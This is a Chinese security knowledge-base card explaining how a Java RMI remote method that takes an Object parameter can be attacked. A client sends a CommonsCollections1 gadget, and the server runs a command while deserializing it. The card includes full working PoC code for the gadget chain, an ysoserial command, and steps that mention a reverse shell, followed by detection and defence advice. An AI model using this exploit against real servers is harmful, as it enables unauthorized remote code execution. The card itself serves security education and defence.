---
id: web-java-rmi-remote-method-object-param-deserialization
title: RMI 远程方法接收 Object 参数：客户端传入 CommonsCollections payload，服务端反序列化参数时执行命令
type: scenario
domain: web
path: web/java/rmi
technique: rmi-remote-method-object-param-deserialization
tags:
- java
- rmi
- deserialization
- server-side
- gadget
- commons-collections
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V582
  verified_at: '2026-11-12T12:46:43+08:00'
  notes: 已对照原文（1605 行）与全部 36 张截图核对：原文'攻击服务端'节给出 AttackServer 的 evil(Object obj) 远程方法与客户端 r.evil(getpayload())，getpayload 为 CC1（ConstantTransformer/InvokerTransformer/ChainedTransformer/TransformedMap/AnnotationInvocationHandler+Target），图02 服务端弹出计算器；原文文字要求 JDK 1.7、Commons-Collections 3.1（截图控制台实际路径为 jdk1.8.0_65，属原文文字与截图的出入，卡按原文文字表述）。卡中原理（UnicastServerRef 先 readObject 实参）、触发条件、PoC 结构与原文一致；PoC 未在本机复跑；无 sources/source_url；无明确受影响版本（JDK 1.7 为原文环境要求），未设置。dedup 推荐 new，6 个 related 均为注册中心 bind/rebind、lookup op2、JRMPListener 打客户端、JNDI servlet 等其它入口，非同链。
url: /docs/web/java/rmi/web-java-rmi-remote-method-object-param-deserialization/
draft: false
kb_aliases:
- RMI 服务端反序列化
- RMI 参数反序列化
- RMI 远程方法参数打服务端
- Remote 方法 Object 参数
- 攻击 RMI 服务端
- RMI client-to-server deserialization
---

## 一句话结论

当 RMI 远程接口暴露了参数类型为 `Object`（或任意可序列化类型）的方法时，任何能连上该 RMI 端口的客户端都可以在调用时传入一个 CommonsCollections gadget 对象；服务端在真正执行方法前必须反序列化参数，`readObject` 阶段即触发命令执行——攻击方向是“客户端打服务端”，不需要注册中心或 codebase。

## 原理

- RMI 的方法调用参数通过 Java 序列化传输。客户端 Stub 把实参写入 `MarshalOutputStream`，服务端 Skeleton/Dispatcher 在 `UnicastServerRef` 中先 `readObject()` 还原实参，再反射调用目标方法。
- 如果接口把参数声明为 `Object`、`Serializable`、`Map`、`List` 等宽类型，服务端就不会对具体实现类做限制；攻击者可以传任意可序列化对象。
- 在服务端 classpath 存在 Commons-Collections 3.1（或其它 gadget）且 JDK 允许该链时，`AnnotationInvocationHandler.readObject` 会遍历 `TransformedMap` 并在 `setValue` 时触发 `ChainedTransformer`（ConstantTransformer→InvokerTransformer `getMethod`/`invoke`/`exec`），在参数反序列化阶段执行命令。
- 与“打注册中心”的区别：注册中心利用的是 `RegistryImpl_Skel` 的固定分支；本场景利用的是业务 RMI 接口自身的方法参数面。任何暴露 RMI 服务的应用，只要方法签名足够宽，都可能成为反序列化入口。
- RMI 本身没有认证与授权机制；能访问端口就能调用已绑定对象的方法（需要知道接口名/方法签名），因此“暴露即风险”。

## 触发条件

- RMI 服务端接口存在参数为 `Object` 或宽泛可序列化类型的方法（原文示例 `evil(Object obj)`）。
- 攻击者能访问 RMI 端口（1099 注册中心 + 随机/固定服务端口）并能 look up 到目标对象。
- 服务端 classpath 有可用 gadget（原文 Commons-Collections 3.1，JDK 1.7）。
- 服务端 JDK/过滤器未阻止该 gadget 的反序列化。

## 利用步骤

1. 枚举 RMI 服务与远程对象（端口扫描、`rmg`/remote-method-guesser 或本文方式 `LocateRegistry.getRegistry` + `lookup`）。
2. 确认目标接口的方法签名，寻找 `Object`/`Serializable`/集合类型参数且可被外部调用的方法。
3. 构造 CommonsCollections1 等 gadget（ysoserial 或手写 `AnnotationInvocationHandler`+`TransformedMap`），命令为反弹 shell 或 `calc`。
4. 编写客户端：`Naming.lookup("rmi://target:1099/ObjName")` 获取远程对象，强制转换为远程接口并调用宽参数方法，把 gadget 作为实参传入。
5. 服务端在反序列化参数时触发 gadget；命令执行成功后客户端可能看到 `ClassCastException`/调用异常，但命令已执行。

## PoC

```java
// 攻击客户端：把 CC1 gadget 作为 Object 参数传给远程方法
Remoteobj r = (Remoteobj) Naming.lookup("rmi://TARGET:1099/Hello");
r.evil(getPayload());   // evil(Object obj)

public static Object getPayload() throws Exception {
    Transformer[] ts = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                               new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                               new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[]{String.class},
                               new Object[]{"calc"})};
    Transformer chain = new ChainedTransformer(ts);
    Map inner = new HashMap();
    inner.put("value", "lala");
    Map transformed = TransformedMap.decorate(inner, null, chain);
    Class<?> cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> ctor = cl.getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    return ctor.newInstance(Target.class, transformed);
}
```

```text
# 等价做法：用 ysoserial 生成 CC1 序列化对象，再由 Java 客户端作为参数传入远程方法
java -jar ysoserial.jar CommonsCollections1 'calc' > payload.bin
```

## 变体与关联

- 变体：参数为 `Map`/`List`/`Serializable` 时同理，只要服务端对实现类不设限；甚至 `String` 参数在反序列化阶段也可能被绕过（取决于实现）。
- 变体：注册中心侧的 bind/rebind 分支反序列化见 [[web-java-rmi-registry-bind-rebind-deserialization]]；冒充注册中心打客户端见 [[web-java-rmi-jrmp-listener-fake-registry-scanner-counterattack]]。
- 关联：[[web-java-rmi-registry-lookup-checkaccess-jrmp-bypass]]（同一 `readObject` 面的注册中心版本）、[[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]（RMI/JNDI 远程类加载方向）。
- 边界：方法参数被声明为具体不可变类型且服务端有反序列化过滤器（JEP290/jdk.serialFilter）、classpath 无 gadget、RMI 端口不可达时失效。

## 检测与防御

- 检测：RMI 端口出现异常调用与序列化流中的 `AnnotationInvocationHandler`、`TransformedMap`、`InvokerTransformer` 等类名；服务端反序列化异常与命令进程创建；对 1099 及 RMI 高端口的异常来源做告警。
- 防御：不要把 RMI 服务暴露到不可信网络；业务接口避免 `Object`/宽泛可序列化参数；升级 JDK 并配置 `jdk.serialFilter` 白名单（JEP290）；移除 classpath 中不必要的 gadget 库；用 TLS/自定义 SocketFactory 限制客户端并在网络层做 ACL。
